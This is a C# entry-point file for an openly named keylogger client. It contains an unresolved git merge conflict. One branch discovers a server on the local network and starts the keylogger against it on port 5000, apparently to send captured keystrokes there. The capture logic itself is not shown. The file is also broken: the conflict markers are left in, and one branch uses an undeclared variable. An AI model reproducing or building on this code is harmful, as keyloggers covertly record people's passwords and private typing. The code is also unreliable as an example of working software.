using KeyloggerClient;

/// <summary>
/// Entry point for the keylogger client application.
/// </summary>
class Program
{
    /// <summary>
    /// The main asynchronous entry method that starts the keylogger client.
    /// </summary>
    /// <returns>A Task representing the asynchronous operation.</returns>
    static async Task Main()
    {
<<<<<<< HEAD
        var client = new KeyloggerClient.KeyloggerClient();
        await client.StartAsync();
=======
        string serverIp = await ServerDiscovery.DiscoverServerAsync();

        if (serverIp != null)
        {
            Console.WriteLine("Discovered server at: " + serverIp);
            await keyloggerClient.StartAsync(serverIp, 5000);
        }
        else
        {
            Console.WriteLine("Server not found on local network.");
        }

>>>>>>> 2328a60 (changes)
    }
}
